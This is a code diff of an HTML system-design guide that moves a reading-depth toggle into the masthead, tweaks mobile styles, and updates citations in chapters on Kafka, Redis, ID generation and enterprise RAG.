@@ -144,15 +144,49 @@ body {
   color: #ffffff;
   border-color: var(--blue);
 }
+.depth-switch {
+  display: inline-flex;
+  align-items: center;
+  background: var(--bg-Warm);
+  border: 1px solid var(--border);
+  border-radius: 7px;
+  padding: 2px;
+  gap: 2px;
+}
+.depth-btn {
+  border: none;
+  background: transparent;
+  color: var(--text-muted);
+  font-family: inherit;
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 1.25;
+  padding: 5px 10px;
+  border-radius: 5px;
+  cursor: pointer;
+  white-space: nowrap;
+  transition: background 0.15s ease, color 0.15s ease;
+}
+.depth-btn:hover:not(.active) {
+  color: var(--text);
+}
+.depth-btn.active {
+  background: var(--blue);
+  color: #ffffff;
+}
 @media (max-width: 600px) {
   .masthead { padding: 6px 10px; gap: 6px; }
-  .brand-title { font-size: 16.5px; }
+  .mast-actions { gap: 4px; }
+  .brand-title { font-size: 15.5px; }
   .hide-xs { display: none; }
-  .top-btn, .menu-btn { padding: 5px 8px; font-size: 12px; }
+  .top-btn, .menu-btn { padding: 5px 7px; font-size: 12px; }
+  .depth-btn { padding: 4px 7px; font-size: 11.5px; }
 }
-@media (max-width: 370px) {
-  .brand-title { font-size: 14.5px; }
+@media (max-width: 400px) {
+  .brand-title { font-size: 14px; }
+  .hide-xxs { display: none; }
   .top-btn, .menu-btn { padding: 5px 6px; font-size: 11.5px; }
+  .depth-btn { padding: 3px 6px; font-size: 11px; }
 }
 .sidebar-backdrop {
   display: none;
@@ -264,63 +298,6 @@ body {
   letter-spacing: 0.06em;
   color: var(--accent);
   margin-bottom: 14px;
-}
-.depth-bar {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  flex-wrap: wrap;
-  gap: 10px;
-  padding: 10px 14px;
-  margin: 0 0 22px;
-  background: var(--bg-Warm);
-  border: 1px solid var(--border);
-  border-radius: 10px;
-  font-size: 13px;
-}
-.depth-meta {
-  display: flex;
-  align-items: center;
-  flex-wrap: wrap;
-  gap: 8px;
-  min-width: 0;
-}
-.depth-pill-tag {
-  background: var(--blue-soft);
-  color: var(--blue);
-  font-weight: 700;
-  font-size: 11px;
-  text-transform: uppercase;
-  letter-spacing: 0.04em;
-  padding: 2px 8px;
-  border-radius: 999px;
-}
-.depth-desc {
-  color: var(--text-muted);
-  font-size: 12.5px;
-}
-.depth-switch {
-  display: inline-flex;
-  background: var(--surface);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  padding: 2px;
-  gap: 2px;
-}
-.depth-btn {
-  border: none;
-  background: transparent;
-  color: var(--text-muted);
-  font-size: 12px;
-  font-weight: 700;
-  padding: 5px 10px;
-  border-radius: 6px;
-  cursor: pointer;
-  white-space: nowrap;
-}
-.depth-btn.active {
-  background: var(--blue);
-  color: #ffffff;
 }
 .ch-title {
   font-family: var(--font-body);
@@ -755,13 +732,17 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
   <div class="mast-left">
     <button class="menu-btn" onclick="toggleSidebar()" aria-label="Toggle chapter list">☰ <span class="hide-xs">Chapters</span></button>
     <div class="brand">
-      <span class="brand-title">System Design Field Guide</span>
+      <span class="brand-title">System Design<span class="hide-xs"> Field Guide</span></span>
       <span class="brand-sub">First-Principles Stories & Visual Architectures</span>
     </div>
   </div>
   <div class="mast-actions">
+    <div class="depth-switch" role="group" aria-label="Reading depth" title="Global reading depth: concise Core chapters vs expanded Deep Dives">
+      <button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core</button>
+      <button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep</button>
+    </div>
     <button class="top-btn" id="toggle-threads-btn" onclick="toggleAllThreads()" title="Expand or collapse all inline Q&A threads">💬 <span class="hide-xs">Threads (</span><span id="thread-total-count">0</span><span class="hide-xs">)</span></button>
-    <button class="top-btn" onclick="openSourceModal()" title="Suggest a new source via GitHub Issue">+ <span class="hide-xs">Suggest </span>Source</button>
+    <button class="top-btn" onclick="openSourceModal()" title="Suggest a new source via GitHub Issue" aria-label="Suggest a new source">+ <span class="hide-xs">Suggest </span><span class="hide-xxs">Source</span></button>
     <button class="top-btn" onclick="openTokenModal()" id="gh-token-btn" title="Connect GitHub token for 1-click issue posting">🔑 <span class="hide-xs" id="gh-token-label">GitHub</span></button>
     <button class="top-btn" onclick="toggleTheme()" title="Toggle light/dark mode" aria-label="Toggle theme">◐</button>
   </div>
@@ -900,7 +881,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li class="annotatable" data-anchor="ch01-b44"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Martin Kleppmann, <em>Designing Data-Intensive Applications (DDIA)</em>, Chapter 1: Reliability, Scalability, and Maintainability — <a href="https://dataintensive.net/" target="_blank" rel="noopener">dataintensive.net</a></li>
 <li class="annotatable" data-anchor="ch01-b45"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Jeff Dean &amp; Colin Scott, <em>Latency Numbers Every Programmer Should Know</em> — <a href="https://colin-scott.github.io/personal_website/research/interactive_latency.html" target="_blank" rel="noopener">Interactive Visualizer</a></li>
 <li class="annotatable" data-anchor="ch01-b46"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Redis Official Documentation, <em>Redis Benchmarks &amp; Single-Threaded Event Loop</em> — <a href="https://redis.io/docs/" target="_blank" rel="noopener">redis.io/docs</a></li>
-<li class="annotatable" data-anchor="ch01-b47"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> Jay Kreps (LinkedIn), <em>The Log: What every software engineer should know about real-time data&#x27;s unifying abstraction</em> — <a href="https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying" target="_blank" rel="noopener">engineering.linkedin.com</a></li>
+<li class="annotatable" data-anchor="ch01-b47"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[5]</a></strong> Jay Kreps, <em>The Log: What every software engineer should know about real-time data&#x27;s unifying abstraction</em> &amp; Apache Kafka Design Docs — <a href="https://kafka.apache.org/documentation/" target="_blank" rel="noopener">kafka.apache.org/documentation</a></li>
 <li class="annotatable" data-anchor="ch01-b48"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[6]</a></strong> Chip Huyen, <em>AI Engineering: Building Applications with Foundation Models</em> (O&#x27;Reilly, 2025) — Latency &amp; Token Economics</li>
 <li class="annotatable" data-anchor="ch01-b49"><strong><a href="#ch01-refs" class="cite-ref" title="Jump to chapter references">[7]</a></strong> Discord Engineering, <em>How Discord Stores Trillions of Messages</em> — <a href="https://discord.com/blog/how-discord-stores-trillions-of-messages" target="_blank" rel="noopener">discord.com/blog</a></li>
 </ul><nav class="ch-pager"><div class="pager-spacer"></div><button class="ch-pager-btn next" onclick="openChapter('ch02')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">2. Kafka &amp; Partition Streams</span></button></nav></article><article id="chap-ch02" class="chapter-article" data-ch="ch02"><h1 class="ch-title">Chapter 2: Kafka, Partitions &amp; Why Databases Hate Waiting in Line</h1>
@@ -1072,7 +1053,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <h3 id="ch02-refs" class="annotatable" data-anchor="ch02-b38">Sources &amp; References</h3>
 <ul>
 <li class="annotatable" data-anchor="ch02-b39"><strong><a href="#ch02-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Neha Narkhede, Gwen Shapira &amp; Todd Palino, <em>Kafka: The Definitive Guide</em> (O&#x27;Reilly) — Partitions, Consumer Groups &amp; Delivery Guarantees</li>
-<li class="annotatable" data-anchor="ch02-b40"><strong><a href="#ch02-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Jay Kreps, <em>The Log: What every software engineer should know about real-time data&#x27;s unifying abstraction</em> — <a href="https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying" target="_blank" rel="noopener">LinkedIn Engineering</a></li>
+<li class="annotatable" data-anchor="ch02-b40"><strong><a href="#ch02-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Jay Kreps, <em>The Log: What every software engineer should know about real-time data&#x27;s unifying abstraction</em> &amp; Apache Kafka Design Docs — <a href="https://kafka.apache.org/documentation/" target="_blank" rel="noopener">kafka.apache.org/documentation</a></li>
 <li class="annotatable" data-anchor="ch02-b41"><strong><a href="#ch02-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Alex Xu, <em>System Design Interview (Vol. 1 &amp; 2)</em>, Notification Service &amp; Message Queues — <a href="https://bytebytego.com/" target="_blank" rel="noopener">ByteByteGo</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch01')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">1. Back-of-the-Envelope Math</span></button><button class="ch-pager-btn next" onclick="openChapter('ch03')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">3. Redis &amp; In-Memory Primitives</span></button></nav></article><article id="chap-ch03" class="chapter-article" data-ch="ch03"><h1 class="ch-title">Chapter 3: Redis &amp; The Four In-Memory Swiss Army Knives</h1>
 <div class="ch-kicker">Part I · Core Building Blocks · 8 min read</div>
@@ -1128,7 +1109,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <hr class="wbw-divider"/>
 <h3 class="annotatable" data-anchor="ch03-b19">3) How to Build a 15-Minute Timer Without Scanning Million-Row Tables</h3>
 <p class="annotatable" data-anchor="ch03-b20">Consider a classic scheduling problem: <em>&quot;Alice wants an AI summary of her low-priority notifications every 15 minutes. How do you know when Alice&#x27;s 15-minute window is up?&quot;</em></p>
-<p class="annotatable" data-anchor="ch03-b21">If you store <code>due_at</code> in a SQL table and run <code>SELECT <em> FROM digests WHERE due_at &lt;= NOW()</code> every second, or if you scan all keys in Redis (<code>KEYS </em></code>), your server will grind to a halt once millions of keys exist.</p>
+<p class="annotatable" data-anchor="ch03-b21">If you store <code>due_at</code> in a SQL table and run <code>SELECT * FROM digests WHERE due_at &lt;= NOW()</code> every second, or if you scan all keys in Redis (<code>KEYS *</code>), your server will grind to a halt once millions of keys exist.</p>
 <p class="annotatable" data-anchor="ch03-b22">Instead, combine a <strong>Redis List</strong> with a <strong>Redis Sorted Set (<code>ZSET</code>)</strong> <a href="#ch03-refs" class="cite-ref" title="Jump to chapter references">[2]</a>:</p>
 <ol>
 <li value="1" class="annotatable" data-anchor="ch03-b23">When Alice&#x27;s <em>first</em> low-priority notification arrives at <code>10:00</code>, append the payload to her Redis List: <code>RPUSH digest_items:Alice &quot;{msg_1}&quot;</code>.</li>
@@ -1496,7 +1477,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <h3 id="ch05-refs" class="annotatable" data-anchor="ch05-b36">Sources &amp; References</h3>
 <ul>
 <li class="annotatable" data-anchor="ch05-b37"><strong><a href="#ch05-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Alex Xu, <em>System Design Interview (Vol. 1)</em>, Chapter 10: Design a Notification System — <a href="https://bytebytego.com/" target="_blank" rel="noopener">ByteByteGo</a></li>
-<li class="annotatable" data-anchor="ch05-b38"><strong><a href="#ch05-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Uber Engineering, <em>Reliable Push Notifications &amp; Event-Driven Consumer Retries at Scale</em> — <a href="https://www.uber.com/blog/engineering/" target="_blank" rel="noopener">uber.com/blog/engineering</a></li>
+<li class="annotatable" data-anchor="ch05-b38"><strong><a href="#ch05-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> AWS Builders&#x27; Library, <em>Timeouts, Retries, and Backoff with Jitter</em> — <a href="https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/" target="_blank" rel="noopener">aws.amazon.com/builders-library</a></li>
 <li class="annotatable" data-anchor="ch05-b39"><strong><a href="#ch05-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Chip Huyen, <em>AI Engineering</em> (2025) — Latency Fallbacks, Batching &amp; Deterministic Guardrails</li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch04')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">4. Database Keys &amp; Sharding</span></button><button class="ch-pager-btn next" onclick="openChapter('ch06')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">6. URL Shortener &amp; Snowflake IDs</span></button></nav></article><article id="chap-ch06" class="chapter-article" data-ch="ch06"><h1 class="ch-title">Chapter 6: URL Shortener &amp; Distributed ID Generation (TinyURL &amp; Snowflake)</h1>
 <div class="ch-kicker">Part II · Classic System Design Stories · 7 min read</div>
@@ -1571,8 +1552,8 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <h3 id="ch06-refs" class="annotatable" data-anchor="ch06-b38">Sources &amp; References</h3>
 <ul>
 <li class="annotatable" data-anchor="ch06-b39"><strong><a href="#ch06-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Alex Xu, <em>System Design Interview (Vol. 1)</em>, Chapter 7: Design Unique ID Generator &amp; Chapter 8: Design a URL Shortener — <a href="https://bytebytego.com/" target="_blank" rel="noopener">ByteByteGo</a></li>
-<li class="annotatable" data-anchor="ch06-b40"><strong><a href="#ch06-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Twitter Engineering, <em>Announcing Snowflake (64-bit Time-Ordered ID Generation)</em> — <a href="https://blog.x.com/engineering/en_us/a/2010/announcing-snowflake" target="_blank" rel="noopener">blog.x.com/engineering</a></li>
-<li class="annotatable" data-anchor="ch06-b41"><strong><a href="#ch06-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Instagram Engineering, <em>Sharding &amp; IDs at Instagram</em> — <a href="https://instagram-engineering.com/sharding-ids-at-instagram-1cf5a71e5a5c" target="_blank" rel="noopener">instagram-engineering.com</a></li>
+<li class="annotatable" data-anchor="ch06-b40"><strong><a href="#ch06-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Twitter (X) Open Source, <em>Snowflake: 64-bit Time-Ordered Distributed ID Generation</em> — <a href="https://github.com/twitter-archive/snowflake" target="_blank" rel="noopener">github.com/twitter-archive/snowflake</a></li>
+<li class="annotatable" data-anchor="ch06-b41"><strong><a href="#ch06-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Instagram &amp; Meta Engineering, <em>Distributed Sharding &amp; IDs at Scale (PostgreSQL &amp; TAO)</em> — <a href="https://engineering.fb.com/2013/06/25/core-infra/tao-the-power-of-the-graph/" target="_blank" rel="noopener">engineering.fb.com</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch05')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">5. Global Notification + AI Digest</span></button><button class="ch-pager-btn next" onclick="openChapter('ch07')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">7. Distributed Rate Limiter</span></button></nav></article><article id="chap-ch07" class="chapter-article" data-ch="ch07"><h1 class="ch-title">Chapter 7: Distributed Rate Limiter (Token Bucket, Redis Lua &amp; LLM Token Caps)</h1>
 <div class="ch-kicker">Part II · Classic System Design Stories · 8 min read</div>
 <p class="annotatable" data-anchor="ch07-b01">Imagine a bug in a customer&#x27;s retry loop causes their script to call your <code>POST /checkout</code> endpoint <code>50,000 times per second</code>.</p>
@@ -1781,7 +1762,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <ol>
 <li value="1" class="annotatable" data-anchor="ch08-b20"><strong>Normal Users (<code>&lt; 10,000 followers</code>):</strong> Use <strong>Fan-Out on Write (Push)</strong> via Kafka workers into followers&#x27; Redis <code>ZSET</code> / <code>List</code> caches (storing only lightweight <code>(post_id, author_id, timestamp)</code> tuples, never full post JSON!).</li>
 <li value="2" class="annotatable" data-anchor="ch08-b21"><strong>Celebrities / Hot Accounts (<code>&gt;= 10,000 followers</code>):</strong> Use <strong>Fan-Out on Read (Pull)</strong>. Write once to the celebrity&#x27;s cache; when an active follower loads their feed, merge the celebrity&#x27;s recent posts at read time.</li>
-<li value="3" class="annotatable" data-anchor="ch08-b22"><strong>Hydration via Two-Tier Cache:</strong> Once the Feed Service has the final sorted list of 20 <code>post_id</code>s, it batch-fetches (<code>MGET</code>) the full post text, image CDN URLs, and like counts from a <strong>Post &amp; User Cache</strong> <a href="#ch08-refs" class="cite-ref" title="Jump to chapter references">[1]</a>.</li>
+<li value="3" class="annotatable" data-anchor="ch08-b22"><strong>Hydration via Two-Tier Cache:</strong> Once the Feed Service has the final sorted list of 20 <code>post_id</code>s, it batch-fetches (<code>MGET</code>) the full post text, image CDN URLs, and like counts from a <strong>Post &amp; User Cache</strong> <a href="#ch08-refs" class="cite-ref" title="Jump to chapter references">[1, 3]</a>.</li>
 </ol>
 <hr class="wbw-divider"/>
 <h3 class="annotatable" data-anchor="ch08-b23">Quick Self-Check</h3>
@@ -1839,7 +1820,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <p class="annotatable" data-anchor="ch09-b21">How do WhatsApp and Slack avoid the <strong>presence storm</strong>? <a href="#ch09-refs" class="cite-ref" title="Jump to chapter references">[1]</a></p>
 <ol>
 <li value="1" class="annotatable" data-anchor="ch09-b22"><strong>Heartbeat TTL in Redis:</strong> Bob&#x27;s client sends a tiny heartbeat every <code>10 seconds</code>, refreshing <code>SET presence:Bob &quot;online&quot; EX 30</code>. If Bob disconnects, the key simply expires after 30 seconds—no explicit &quot;offline&quot; database write needed!</li>
-<li value="2" class="annotatable" data-anchor="ch09-b23"><strong>Lazy / Scoped Subscription:</strong> Only push live presence updates for the <strong>5–10 people currently visible on Alice&#x27;s screen</strong> (or inside small groups <code>&lt; 50</code> members). For giant 10,000-person channels, fetch online counts lazily on demand.</li>
+<li value="2" class="annotatable" data-anchor="ch09-b23"><strong>Lazy / Scoped Subscription:</strong> Only push live presence updates for the <strong>5–10 people currently visible on Alice&#x27;s screen</strong> (or inside small groups <code>&lt; 50</code> members). For giant 10,000-person channels, fetch online counts lazily on demand or via edge caches <a href="#ch09-refs" class="cite-ref" title="Jump to chapter references">[3]</a>.</li>
 </ol>
 <hr class="wbw-divider"/>
 <h3 class="annotatable" data-anchor="ch09-b24">Quick Self-Check</h3>
@@ -1948,10 +1929,10 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <h3 id="ch10-refs" class="annotatable" data-anchor="ch10-b38">Sources &amp; References</h3>
 <ul>
 <li class="annotatable" data-anchor="ch10-b39"><strong><a href="#ch10-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Alex Xu, <em>System Design Interview (Vol. 2)</em>, Chapter 1: Proximity Service, Chapter 2: Nearby Friends &amp; Chapter 7: Hotel/Ticket Reservation System — <a href="https://bytebytego.com/" target="_blank" rel="noopener">ByteByteGo</a></li>
-<li class="annotatable" data-anchor="ch10-b40"><strong><a href="#ch10-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Uber Engineering, <em>H3: Uber&#x27;s Hexagonal Hierarchical Spatial Index</em> — <a href="https://www.uber.com/blog/h3/" target="_blank" rel="noopener">uber.com/blog/h3</a></li>
+<li class="annotatable" data-anchor="ch10-b40"><strong><a href="#ch10-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Uber Open Source, <em>H3: Hexagonal Hierarchical Geospatial Indexing System</em> — <a href="https://h3geo.org/" target="_blank" rel="noopener">h3geo.org</a></li>
+<li class="annotatable" data-anchor="ch10-b41"><strong><a href="#ch10-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Martin Kleppmann, <em>How to do distributed locking (Leases &amp; Fencing Tokens)</em> — <a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html" target="_blank" rel="noopener">martin.kleppmann.com</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch09')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">9. Real-Time Chat &amp; Presence</span></button><button class="ch-pager-btn next" onclick="openChapter('ch11')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">11. Production RAG &amp; ACL Security</span></button></nav></article><article id="chap-ch11" class="chapter-article" data-ch="ch11"><h1 class="ch-title">Chapter 11: Production RAG, Hybrid Search &amp; Enterprise ACL Security</h1>
 <div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 17 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
 <p class="annotatable" data-anchor="ch11-b01">Every weekend tutorial makes <strong>Retrieval-Augmented Generation (RAG)</strong> look like 10 lines of Python: chop a PDF into 500-word chunks, call an embedding API, dump vectors into a vector database, and pass the top 3 matches to an LLM.</p>
 <p class="annotatable" data-anchor="ch11-b02">Then you deploy that prototype at a real company with 50,000 internal documents, and three things immediately go wrong:</p>
 <ol>
@@ -2068,7 +2049,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <ol>
 <li value="1" class="annotatable" data-anchor="ch11-b13"><strong>Stage 1 — Parallel Hybrid Retrieval (<code>Top 50</code> in <code>~30 ms</code>):</strong> Run <code>BM25</code> keyword search AND <code>HNSW</code> vector search in parallel, then merge the two ranked lists using <strong>Reciprocal Rank Fusion (<code>RRF</code>)</strong>:</li>
 </ol>
-<p class="annotatable" data-anchor="ch11-b14">   <code>score(doc) = 1 / (60 + rank_bm25) + 1 / (60 + rank_vector)</code> <a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[2]</a>.</p>
+<p class="annotatable" data-anchor="ch11-b14">   <code>score(doc) = 1 / (60 + rank_bm25) + 1 / (60 + rank_vector)</code> <a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[2, 4]</a>.</p>
 <ol>
 <li value="2" class="annotatable" data-anchor="ch11-b15"><strong>Stage 2 — Cross-Encoder Reranker (<code>Top 50 -&gt; Top 5</code> in <code>~60 ms</code>):</strong> Pass the 50 candidate chunks + query into a compact <strong>Cross-Encoder Reranker</strong> (like <code>Cohere Rerank</code> or <code>BGE-Reranker</code>). Unlike embeddings (which compress a whole chunk into one vector ahead of time), a Cross-Encoder attends across every query word and chunk word together, picking the <strong>Top 5 gold chunks</strong> so your LLM prompt stays short, cheap, and accurate.</li>
 </ol>
@@ -2086,7 +2067,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </tr>
 <tr class="annotatable" data-anchor="ch11-d03">
 <td><strong>2. Chunk Size &amp; Overlap</strong></td>
-<td><strong>Small (<code>128–256</code> tokens):</strong> Sharp embedding focus, lacks surrounding context.&lt;br&gt;<strong>Medium (<code>400–600</code> tokens, <code>10–15%</code> overlap):</strong> Industry sweet spot.&lt;br&gt;<strong>Large (<code>1,024+</code> tokens):</strong> Dilutes vector specificity; wastes prompt budget.</td>
+<td><strong>Small (<code>128–256</code> tokens):</strong> Sharp embedding focus, lacks surrounding context.<br/><strong>Medium (<code>400–600</code> tokens, <code>10–15%</code> overlap):</strong> Industry sweet spot.<br/><strong>Large (<code>1,024+</code> tokens):</strong> Dilutes vector specificity; wastes prompt budget.</td>
 <td><strong>Contextual Retrieval Fix <a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[2]</a>:</strong> Prepend a 1-sentence document/section breadcrumb (<code>&quot;[Doc: Q3 Billing Policy &gt; EU Refunds] ...&quot;</code>) to each <code>400</code>-token chunk <em>before</em> computing both its embedding and BM25 terms—cutting retrieval failure rates by <code>~49%</code>.</td>
 </tr>
 <tr class="annotatable" data-anchor="ch11-d04">
@@ -2096,7 +2077,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 </tr>
 <tr class="annotatable" data-anchor="ch11-d05">
 <td><strong>4. Grounded Synthesis &amp; Citations</strong></td>
-<td>Format retrieved chunks with XML/ID tags (<code>&lt;source id=&quot;doc_42#c7&quot;&gt;...&lt;/source&gt;</code>) and instruct the model to emit inline <code>[doc_42#c7]</code> citations—or abstain if unsupported.</td>
+<td>Format retrieved chunks with XML/ID tags (<code>&lt;source id=&quot;doc_42#c7&quot;&gt;...&lt;/source&gt;</code>) and instruct the model to emit inline <code>[doc_42#c7]</code> citations—or abstain if unsupported <a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[3]</a>.</td>
 <td>Run a lightweight post-check verifying that every cited <code>id</code> actually exists in the retrieved Top-K set (catching fabricated citation IDs before streaming to the UI).</td>
 </tr>
 </tbody></table></div>
@@ -2118,7 +2099,7 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <details class="deep-dive"><summary class="deep-dive-summary"><span class="dd-left"><span class="dd-badge">🔬 Deep Dive</span><span class="dd-title">Index Freshness, CDC Tombstones &amp; Permission Revocation</span></span><span class="dd-time">+4 min</span></summary><div class="deep-dive-body">
 <p class="annotatable" data-anchor="ch11-d06">Static benchmarks ignore the hardest day-2 RAG problem: <strong>source documents and user permissions change every minute</strong>.</p>
 <ol>
-<li value="1" class="annotatable" data-anchor="ch11-d07"><strong>Event-Driven CDC Ingestion (<code>&lt; 30s</code> Freshness):</strong> Publish source writes (<code>doc.updated</code>, <code>doc.deleted</code>, <code>acl.changed</code>) via an <strong>Outbox + Kafka</strong> pipeline. Hash each normalized chunk (<code>SHA256(text)</code>): when a 50-page doc changes one paragraph, re-embed only the <code>1–2</code> dirty chunks instead of all <code>120</code> chunks.</li>
+<li value="1" class="annotatable" data-anchor="ch11-d07"><strong>Event-Driven CDC Ingestion (<code>&lt; 30s</code> Freshness):</strong> Publish source writes (<code>doc.updated</code>, <code>doc.deleted</code>, <code>acl.changed</code>) via an <strong>Outbox + Kafka</strong> pipeline <a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[1]</a>. Hash each normalized chunk (<code>SHA256(text)</code>): when a 50-page doc changes one paragraph, re-embed only the <code>1–2</code> dirty chunks instead of all <code>120</code> chunks <a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[3]</a>.</li>
 <li value="2" class="annotatable" data-anchor="ch11-d08"><strong>Permission-Change Decoupling:</strong> If <code>doc_42</code> moves from <code>public</code> to <code>exec-only</code>, re-embedding vectors is wasteful. Store ACLs in a fast metadata attribute / joinable permission table so ACL updates take effect in milliseconds without touching float vectors.</li>
 <li value="3" class="annotatable" data-anchor="ch11-d09"><strong>Deleted/Superseded Version Guard:</strong> If Kafka CDC lags by <code>10 seconds</code>, a recently deleted doc could still appear in HNSW. Perform a <code>2 ms</code> batch primary-key/version check (<code>SELECT id, acl_epoch FROM docs_meta WHERE id IN (...)</code>) on the final Top 5 chunks right before prompt assembly to guarantee <strong>read-after-delete</strong> and <strong>instant ACL revocation</strong>.</li>
 </ol>
@@ -2147,9 +2128,9 @@ details.deep-dive[open] > summary.deep-dive-summary .dd-left::before {
 <li class="annotatable" data-anchor="ch11-b31"><strong><a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[1]</a></strong> Chip Huyen, <em>AI Engineering: Building Applications with Foundation Models</em> (O&#x27;Reilly, 2025) — RAG, Hybrid Retrieval &amp; Reranking</li>
 <li class="annotatable" data-anchor="ch11-b32"><strong><a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[2]</a></strong> Anthropic Engineering, <em>Contextual Retrieval: Combining Contextual Embeddings and Contextual BM25 with Reranking</em> (2024) — <a href="https://www.anthropic.com/news/contextual-retrieval" target="_blank" rel="noopener">anthropic.com/news/contextual-retrieval</a></li>
 <li class="annotatable" data-anchor="ch11-b33"><strong><a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[3]</a></strong> Eugene Yan et al., <em>Applied LLMs: What We&#x27;ve Learned From A Year of Building with LLMs</em> — <a href="https://applied-llms.org/" target="_blank" rel="noopener">applied-llms.org</a></li>
+<li class="annotatable" data-anchor="ch11-b34"><strong><a href="#ch11-refs" class="cite-ref" title="Jump to chapter references">[4]</a></strong> Gordon V. Cormack, Charles L. A. Clarke &amp; Stefan Buettcher, <em>Reciprocal Rank Fusion Outperforms Condorcet and Individual Rank Learning Methods</em> (ACM SIGIR 2009) — <a href="https://plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf" target="_blank" rel="noopener">plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf</a></li>
 </ul><nav class="ch-pager"><button class="ch-pager-btn prev" onclick="openChapter('ch10')"><span class="pager-dir">← Previous Chapter</span><span class="pager-title">10. Flash Sales &amp; Uber Geospatial</span></button><button class="ch-pager-btn next" onclick="openChapter('ch12')"><span class="pager-dir">Next Chapter →</span><span class="pager-title">12. AI Agents, Guardrails &amp; Evals</span></button></nav></article><article id="chap-ch12" class="chapter-article" data-ch="ch12"><h1 class="ch-title">Chapter 12: AI Agents, Tool Guardrails &amp; Evaluation Pipelines</h1>
 <div class="ch-kicker">Part III · AI &amp; LLM Engineering Systems · 8 min core · 17 min with deep dives</div>
-<div class="depth-bar"><div class="depth-meta"><span class="depth-pill-tag">Progressive Disclosure</span><span class="depth-desc">2 Deep Dives available — read concise core or expand all:</span></div><div class="depth-switch" role="group" aria-label="Reading depth"><button type="button" class="depth-btn active" data-depth="core" onclick="setReadingDepth('core')">Core (~8m)</button><button type="button" class="depth-btn" data-depth="deep" onclick="setReadingDepth('deep')">Deep Dive (~18m)</button></div></div>
